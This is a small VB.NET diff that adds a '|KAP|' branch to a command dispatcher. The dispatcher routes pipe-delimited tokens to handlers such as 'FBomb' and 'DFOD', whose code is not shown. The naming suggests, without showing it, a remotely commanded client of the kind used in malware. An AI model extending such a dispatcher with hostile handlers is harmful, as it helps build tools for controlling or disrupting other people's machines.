@@ -17,12 +17,15 @@ Public Class MainCL
             Await Task.Run(Sub() V2.FBomb(h(2)))
 
         ElseIf h(1) = "|DFOD|" Then
+
             If h(2) = 1 Then
                 Await Task.Run(Sub() V3.DFOD(True))
             Else
                 Await Task.Run(Sub() V3.DFOD(False))
             End If
 
+        ElseIf h(1) = "|KAP|" Then
+            Await Task.Run(Sub() V4.KAP())
         End If
     End Sub
 End Class
